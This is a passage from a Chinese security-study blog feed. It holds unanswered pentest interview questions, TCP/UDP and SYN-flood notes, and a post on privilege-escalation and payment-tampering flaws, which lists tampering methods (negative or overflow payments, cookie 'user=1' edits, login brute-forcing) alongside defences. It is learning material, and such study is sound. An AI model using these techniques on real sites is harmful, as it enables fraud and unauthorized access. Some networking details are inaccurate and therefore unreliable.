<h3 id="问题37：land攻击是什么"><a href="#问题37：land攻击是什么" class="headerlink" title="问题37：land攻击是什么?"></a>问题37：land攻击是什么?</h3><p><strong>答案：</strong></p>
<h3 id="问题38：你会如何进行信息收集"><a href="#问题38：你会如何进行信息收集" class="headerlink" title="问题38：你会如何进行信息收集?"></a>问题38：你会如何进行信息收集?</h3><p><strong>答案：</strong></p>
<h3 id="问题39：什么是CRLF注入攻击"><a href="#问题39：什么是CRLF注入攻击" class="headerlink" title="问题39：什么是CRLF注入攻击?"></a>问题39：什么是CRLF注入攻击?</h3><p><strong>答案：</strong></p>
<h3 id="问题40：防止XSS，前端后端两个角度"><a href="#问题40：防止XSS，前端后端两个角度" class="headerlink" title="问题40：防止XSS，前端后端两个角度?"></a>问题40：防止XSS，前端后端两个角度?</h3><p><strong>答案：</strong></p>
<h3 id="问题41：如何防护一个端口的安全"><a href="#问题41：如何防护一个端口的安全" class="headerlink" title="问题41：如何防护一个端口的安全?"></a>问题41：如何防护一个端口的安全?</h3><p><strong>答案：</strong></p>
<h3 id="问题42：webshell检测思路"><a href="#问题42：webshell检测思路" class="headerlink" title="问题42：webshell检测思路?"></a>问题42：webshell检测思路?</h3><p><strong>答案：</strong></p>
<h3 id="问题43：GPC是什么-开启了怎么绕过"><a href="#问题43：GPC是什么-开启了怎么绕过" class="headerlink" title="问题43：GPC是什么?开启了怎么绕过"></a>问题43：GPC是什么?开启了怎么绕过</h3><p><strong>答案：</strong></p>
<h3 id="问题44：web常用的加密算法有什么"><a href="#问题44：web常用的加密算法有什么" class="headerlink" title="问题44：web常用的加密算法有什么"></a>问题44：web常用的加密算法有什么</h3><p><strong>答案：</strong></p>
<h3 id="问题45：XSS除了获取cookies还能做什么"><a href="#问题45：XSS除了获取cookies还能做什么" class="headerlink" title="问题45：XSS除了获取cookies还能做什么?"></a>问题45：XSS除了获取cookies还能做什么?</h3><p><strong>答案：</strong></p>
<p> rip协议是什么? rip的工作原理</p>
<h3 id="问题46：运营商（或其他）网络劫持"><a href="#问题46：运营商（或其他）网络劫持" class="headerlink" title="问题46：运营商（或其他）网络劫持"></a>问题46：运营商（或其他）网络劫持</h3><h1 id="二、计网"><a href="#二、计网" class="headerlink" title="二、计网"></a>二、计网</h1><p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619125601482.png"></p>
<p>TCP头部格式，重要部分：</p>
<blockquote>
<p><strong>序列号</strong>：在建立连接时由计算机生成的随机数作为其初始值，通过 SYN 包传给接收端主机，每发送一次数据，就「累加」一次该「数据字节数」的大小。<strong>用来解决网络包乱序问题。</strong></p>
<p><strong>确认应答号</strong>：指下一次「期望」收到的数据的序列号，发送端收到这个确认应答以后可以认为在这个序号以前的数据都已经被正常接收。<strong>用来解决不丢包的问题。</strong></p>
<p><strong>控制位：</strong></p>
<ul>
<li><em>ACK</em>：该位为 <code>1</code> 时，「确认应答」的字段变为有效，TCP 规定除了最初建立连接时的 <code>SYN</code> 包之外该位必须设置为 <code>1</code> 。</li>
<li><em>RST</em>：该位为 <code>1</code> 时，表示 TCP 连接中出现异常必须强制断开连接。</li>
<li><em>SYC</em>：该位为 <code>1</code> 时，表示希望建立连，并在其「序列号」的字段进行序列号初始值的设定。</li>
<li><em>FIN</em>：该位为 <code>1</code> 时，表示今后不会再有数据发送，希望断开连接。当通信结束希望断开连接时，通信双方的主机之间就可以相互交换 <code>FIN</code> 位置为 1 的 TCP 段。</li>
</ul>
</blockquote>
<p>TCP 是<strong>面向连接的、可靠的、基于字节流</strong>的传输层通信协议。</p>
<blockquote>
<ul>
<li><strong>面向连接</strong>：一定是「一对一」才能连接，不能像 UDP 协议 可以一个主机同时向多个主机发送消息，也就是一对多是无法做到的；</li>
<li><strong>可靠的</strong>：无论的网络链路中出现了怎样的链路变化，TCP 都可以保证一个报文一定能够到达接收端；</li>
<li><strong>字节流</strong>：消息是「没有边界」的，所以无论我们消息有多大都可以进行传输。并且消息是「有序的」，当「前一个」消息没有收到的时候，即使它先收到了后面的字节已经收到，那么也不能扔给应用层去处理，同时对「重复」的报文会自动丢弃。</li>
</ul>
</blockquote>
<p>TCP连接是什么？</p>
<blockquote>
<p>建立一个 TCP 连接是需要客户端与服务器端达成以下三个信息的共识。</p>
<ul>
<li><strong>Socket</strong>：由 IP 地址和端口号组成</li>
<li><strong>序列号</strong>：用来解决乱序问题等</li>
<li><strong>窗口大小</strong>：用来做流量控制</li>
</ul>
</blockquote>
<p>唯一确定一个 TCP 连接</p>
<blockquote>
<p>靠四元组。即</p>
<ul>
<li>源地址</li>
<li>源端口</li>
<li>目的地址</li>
<li>目的端口</li>
</ul>
</blockquote>
<p>TCP的出现是因为：</p>
<blockquote>
<p>IP 层是「不可靠」的，它不保证网络包的交付、不保证网络包的按序交付、也不保证网络包中的数据的完整性。</p>
<p>而 TCP 是一个工作在<strong>传输层</strong>的<strong>可靠</strong>数据传输的服务，它能确保接收端接收的网络包是<strong>无损坏、无间隔、非冗余和按序的。</strong></p>
</blockquote>
<p>有一个 IP 的服务器监听了一个端口，它的 TCP 的最大连接数&#x3D;客户端的IP数*客户端的端口数</p>
<blockquote>
<p>对 IPv4，客户端的 IP 数最多为 <code>2</code> 的 <code>32</code> 次方，客户端的端口数最多为 <code>2</code> 的 <code>16</code>次方</p>
</blockquote>
<p>当然由于<strong>文件描述符限制</strong>和<strong>内存限制</strong>，最大连接数不会达到理想状态</p>
<p>UDP与TCP区别</p>
<blockquote>
<p><em>1. 连接</em></p>
<ul>
<li><strong>TCP 是面向连接</strong>的传输层协议，传输数据前先要建立连接。</li>
<li>UDP 是不需要连接，即刻传输数据。</li>
</ul>
<p><em>2. 服务对象</em></p>
<ul>
<li><strong>TCP 是一对一</strong>的两点服务，即一条连接只有两个端点。</li>
<li>UDP 支持一对一、一对多、多对多的交互通信</li>
</ul>
<p><em>3. 可靠性</em></p>
<ul>
<li>TCP 是可靠交付数据的，数据可以无差错、不丢失、不重复、按需到达。</li>
<li><strong>UDP 是尽最大努力交付</strong>，不保证可靠交付数据。</li>
</ul>
<p><em>4. 拥塞控制、流量控制</em></p>
<ul>
<li><strong>TCP 有拥塞控制和流量控制机制</strong>，保证数据传输的安全性。</li>
<li>UDP 则没有，即使网络非常拥堵了，也不会影响 UDP 的发送速率。</li>
</ul>
<p><em>5. 首部开销</em></p>
<ul>
<li><strong>TCP 首部长度较长，会有一定的开销</strong>，首部在没有使用「选项」字段时是 <code>20</code> 个字节，如果使用了「选项」字段则会变长的。</li>
<li><strong>UDP 首部只有 8 个字节</strong>，并且是固定不变的，开销较小。</li>
</ul>
</blockquote>
<p>由于 TCP 是面向连接，能保证数据的<strong>可靠性交付</strong>，因此经常用于：</p>
<ul>
<li><code>FTP</code> 文件传输</li>
<li><code>HTTP</code> &#x2F; <code>HTTPS</code></li>
</ul>
<p>由于 UDP 面向无连接，它可以<strong>随时发送数据</strong>，再加上UDP本身的处理既简单又高效，因此经常用于：</p>
<ul>
<li>包总量较少的通信，如 <code>DNS</code> 、<code>SNMP</code> 等</li>
<li>视频、音频等多媒体通信</li>
<li>广播通信</li>
</ul>
<p>TCP为什么是三次握手</p>
<blockquote>
<ul>
<li>三次握手才可以阻止历史重复连接的初始化（主要原因）</li>
<li>三次握手才可以同步双方的初始序列号</li>
<li>三次握手才可以避免资源浪费</li>
</ul>
</blockquote>
<p>客户端连续发送多次 SYN 建立连接的报文，在网络拥堵等情况下：</p>
<ul>
<li>一个「旧 SVN 报文」比「最新的 SYN 」 报文早到达了服务端；</li>
<li>那么此时服务端就会回一个 <code>SYN + ACK</code> 报文给客户端；</li>
<li>客户端收到后可以根据自身的上下文，判断这是一个历史连接（序列号过期或超时），那么客户端就会发送 <code>RST</code> 报文给服务端，表示中止这一次连接。</li>
</ul>
<p>如果是两次握手连接，就不能判断当前连接是否是历史连接，三次握手则可以在客户端（发送方）准备发送第三次报文时，客户端因有足够的上下文来判断当前连接是否是历史连接：</p>
<ul>
<li>如果是历史连接（序列号过期或超时），则第三次握手发送的报文是 <code>RST</code> 报文，以此中止历史连接；</li>
<li>如果不是历史连接，则第三次发送的报文是 <code>ACK</code> 报文，通信双方就会成功建立连接；</li>
</ul>
<p>总之</p>
<blockquote>
<ul>
<li>「两次握手」：无法防止历史连接的建立，会造成双方资源的浪费，也无法可靠的同步双方序列号；</li>
<li>「四次握手」：三次握手就已经理论上最少可靠连接建立，所以不需要使用更多的通信次数。</li>
</ul>
</blockquote>
<p>IP 层会分片，为什么 TCP 层还需要 MSS ？</p>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230619131302011.png"></p>
<p>IP层本身没有超时重传机制，TCP才有。如果整个(TCP头部+TCP数据)交给IP层分片，当其中一个IP片丢失，整个IP报文都得重传。</p>
<p>为了达到最佳的传输效能 ，TCP 协议就通过MSS切片、重传，效率很高。</p>
<p>SYN 攻击</p>
<blockquote>
<p>TCP 连接建立是需要三次握手，假设攻击者短时间伪造不同 IP 地址的 <code>SYN</code> 报文，服务端每接收到一个 <code>SYN</code> 报文，就进入<code>SYN_RCVD</code> 状态，但服务端发送出去的 <code>ACK + SYN</code> 报文，无法得到未知 IP 主机的 <code>ACK</code> 应答，久而久之就会<strong>占满服务端的 SYN 接收队列（未连接队列）</strong>，使得服务器不能为正常用户服务。</p>
</blockquote>
<p>避免方法</p>
<blockquote>
<p>1.控制SYN_RCVD 状态连接的最大个数，超出时丢弃。</p>
<p>2.SYN队列占满，则启动cookie，net.ipv4.tcp_syncookies &#x3D; 1</p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s/lFnyBaaP3f0eNcKGW5RtCg">图解TCP</a></p>
]]></content>
      <categories>
        <category>网安</category>
      </categories>
      <tags>
        <tag>网安</tag>
      </tags>
  </entry>
  <entry>
    <title>逻辑越权</title>
    <url>/2023/05/22/%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83/</url>
    <content><![CDATA[<h1 id="1-水平垂直越权"><a href="#1-水平垂直越权" class="headerlink" title="1.水平垂直越权"></a>1.水平垂直越权</h1><p>垂直越权访问指：使用低权限身份的账号，能发送高权限账号才能有的请求，获得其高权限的操作。</p>
<p>水平越权访问指：某用户能获取另一个同级别用户的操作</p>
<p>未授权访问：通过删除请求中的认证信息后重放该请求，依然可以完成操作（任何人都可以操作它）</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul>
<li><p>前端安全造成：界面；</p>
<p>判断用户等级后，代码界面部分进行可选显示。</p>
<p>纠正：根据用户等级，应该判断某些功能执不执行；给不给显示<strong>不等于</strong>功能没有</p>
</li>
<li><p>后端安全造成：数据库；</p>
<p>​	user表（管理员与普通用户同表）</p>
<p>​			id,username,password,usertype</p>
<p>​			1,	admin	, 12321321, 	1</p>
<p>​			2,	test		,	1211111,	2</p>
<p>代码通过usertype验证级别。</p>
<p><strong>如果在访问网站数据包中有传输用户的编号、用户组编号或类型编号的时候，那么尝试对这个值进行修改，就是测试越权漏洞的基本。</strong></p>
</li>
</ul>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>pikachu：只判断了登录状态，没有验证级别，因此存在越权</p>
<p>越权检测（小米范工具）</p>
<p>越权检测（burpsuite的插件Authz）</p>
<h3 id="tip"><a href="#tip" class="headerlink" title="tip"></a>tip</h3><p>注册用户时，提示该用户已存在，就可以尝试利用该用户名。</p>
<p>垂直越权：添加用户的前提：</p>
<p>普通用户前端有操作界面可以抓取数据包</p>
<p>通过网站源码本地搭建自己模拟抓取</p>
<p>盲猜</p>
<p>重点关注：url参数和cookie参数如(uid、id)</p>
<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>前后端同时对用户输入信息校验</p>
<p>调用功能（执行关键操作）前验证用户是否有该权限</p>
<p>直接对象引用的加密资源ID、防止攻击者枚举ID、敏感数据特殊化处理</p>
<p>永远不要相信用户的输入，对于可控参数进行严格检查与过滤</p>
<h1 id="2-登录脆弱及支付篡改"><a href="#2-登录脆弱及支付篡改" class="headerlink" title="2.登录脆弱及支付篡改"></a>2.登录脆弱及支付篡改</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="HTTP与HTTPS"><a href="#HTTP与HTTPS" class="headerlink" title="HTTP与HTTPS"></a>HTTP与HTTPS</h3><p>超文本传输协议HTTP协议被用于在Web浏览器和网站服务器之间传递信息，HTTP协议以明文方式发送内容，不提供任何方式的数据加密，如果攻击者截取了Web浏览器和网站服务器之间的传输报文，就可以直接读懂其中的信息。</p>
<p>安全套接字层超文本传输协议HTTPS，为了数据传输的安全，HTTPS在HTTP的基础上加入了SSL协议，SSL依靠证书来验证服务器的身份，并为浏览器和服务器之间的通信加密。HTTPS加密过程：</p>
<ol>
<li><p><strong>客户端发起HTTPS请求</strong></p>
</li>
<li><p><strong>服务器回复公共证书</strong>（采用HTTPS协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织申请，区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面，<strong>这套证书相当于公钥和私钥</strong>）</p>
</li>
<li><p><strong>客户端解析证书</strong>（这部分工作由客户端的TLS来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警告框，提示证书存在问题。</p>
<p>如果证书没有问题，那么<strong>就生成一个随机值，然后用证书对该随机值进行加密</strong>，就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容）</p>
</li>
<li><p><strong>传送加密信息</strong>（<strong>传送的是用证书加密后的随机值，目的就是让服务端得到这个随机值</strong>，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了）</p>
</li>
<li><p><strong>服务器端解密信息</strong>（服务端用私钥解密后，得到了客户端传过来的随机值(私钥)，然后<strong>把内容通过该值</strong>进行<strong>对称加密</strong>，即将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全）</p>
</li>
<li><p><strong>服务器端传输加密后的信息</strong></p>
</li>
<li><p><strong>客户端解密信息</strong>（客户端用之前生成的私钥解密服务段传过来的信息，于是获取了解密后的内容）</p>
</li>
</ol>
<h3 id="SSL协议"><a href="#SSL协议" class="headerlink" title="SSL协议"></a>SSL协议</h3><p>是在传输通信协议（TCP&#x2F;IP）上实现的一种安全协议，采用公开密钥技术，SSL广泛支持各种类型的网络，同时提供三种基本的安全服务，它们都使用公开密钥技术。</p>
<p>其作用为：</p>
<p>（1）、认证用户和服务器，确保数据发送到正确的客户机和服务器；</p>
<p>（2）、加密数据以防止数据中途被窃取；</p>
<p>（3）、维护数据的完整性，确保数据在传输过程中不被改变。</p>
<h3 id="商品业务"><a href="#商品业务" class="headerlink" title="商品业务"></a>商品业务</h3><p>参考网站：<a href="https://www.secpulse.com/archives/67080.html">https://www.secpulse.com/archives/67080.html</a></p>
<h4 id="商品购买流程"><a href="#商品购买流程" class="headerlink" title="商品购买流程"></a>商品购买流程</h4><p>选择商品和数量-&gt;选择支付及配送方式-&gt;生成订单编号-&gt;订单支付选择-&gt;完成支付</p>
<h4 id="常见篡改参数"><a href="#常见篡改参数" class="headerlink" title="常见篡改参数"></a>常见篡改参数</h4><p>商品编号ID，购买价值，购买数量，支付方式，订单号，支付状态等</p>
<h4 id="常见修改方法"><a href="#常见修改方法" class="headerlink" title="常见修改方法"></a>常见修改方法</h4><p>替换支付，重复支付，最小额支付，负数支付，溢出支付，优惠券支付等</p>
<h2 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h2><p>HTTP&#x2F;HTTPS协议密文抓取：f12或bp</p>
<p>后台登录账号密码爆破测试：指弱口令爆破，一般已知账号，爆破密码，如果加密，找到加密的算法。</p>
<p>Cookie脆弱点验证修改测试：如Cookie:user&#x3D;1;</p>
<ol>
<li>登录点暴力破解</li>
<li>HTTP&#x2F;HTTPS传输</li>
<li>Cookie脆弱点验证</li>
<li>Session固定点测试</li>
<li>验证密文比对安全测试</li>
</ol>
<h1 id="3-找回机制及接口安全"><a href="#3-找回机制及接口安全" class="headerlink" title="3.找回机制及接口安全"></a>3.找回机制及接口安全</h1><h1 id="4"><a href="#4" class="headerlink" title="4."></a>4.</h1>]]></content>
      <categories>
        <category>逻辑越权</category>
        <category>WEB漏洞</category>
      </categories>
      <tags>
        <tag>逻辑越权</tag>
      </tags>
  </entry>
</search>
